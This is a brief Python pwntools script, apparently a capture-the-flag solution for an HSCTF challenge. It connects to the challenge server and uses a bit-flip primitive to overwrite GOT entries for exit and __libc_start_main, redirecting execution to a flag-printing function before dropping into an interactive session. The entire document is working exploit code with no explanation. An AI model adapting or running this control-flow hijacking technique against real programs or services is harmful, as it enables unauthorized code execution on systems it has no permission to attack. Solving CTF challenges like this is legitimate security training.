from pwn import *


###Utils
def modify(addr,offset):
    r.sendlineafter('byte: ',hex(addr)[2:])
    r.sendlineafter('bit: ',str(offset))
    r.recvuntil('byte: ')
    return r.recvline()[:-1]


libc_start_got = 0x804a024
exit_got = 0x804a01c
exit_got_orig_ptr = 0x80484f6
flag_func = 0x80486a6

###Exploit
r = remote('pwn.hsctf.com',4444)
print(modify(libc_start_got,0))
print(modify(exit_got+1,1))
print(modify(exit_got,4))
print(modify(exit_got,6))
r.interactive()
